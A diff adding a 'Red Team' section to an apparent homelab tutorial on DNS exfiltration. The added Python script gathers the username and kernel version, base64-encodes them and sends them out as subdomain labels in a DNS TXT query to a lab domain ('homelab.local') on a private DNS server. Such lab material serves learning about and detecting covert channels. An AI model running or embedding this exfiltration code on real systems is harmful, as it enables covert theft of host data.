@@ -90,7 +90,37 @@ nameserver 192.168.1.155 # Change this to the IP of your DNS server
 This simulates real-world DNS connection. In doing this you can keep it isolated to your private network, allowing the infected machine to treat your server as its own DNS - enabling IP resolution. In real-world scenarios this wouldn't be required because the domain would be recognised by a public DNS provider.
 
 # Red Team
-(python script)
+``` python
+def base64_encode(data):
+    # base64 encoding requires input data as bytes
+    if not isinstance(data, bytes):
+       data = data.encode("utf-8")
+    data = base64.b64encode(data)
+    return data.decode("utf-8").strip()
+
+def run_command(commands):
+    # process commands and return stdout as bytes
+    return subprocess.run(commands, capture_output=True).stdout
+
+# Reconnaissance
+import subprocess
+raw_username = run_command("whoami")
+raw_system_info = run_command(["uname", "-r"])
+
+# Encoding
+import base64
+encoded_username = base64_encode(raw_username)
+encoded_system_info = base64_encode(raw_system_info)
+
+# Exfiltration
+import dns.resolver
+domain = ".homelab.local"
+encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
+try:
+    dns.resolver.resolve(encoded_message, 'TXT')
+except Exception as e:
+    pass
+```
 
 When running the script you should get output like below:
 ```
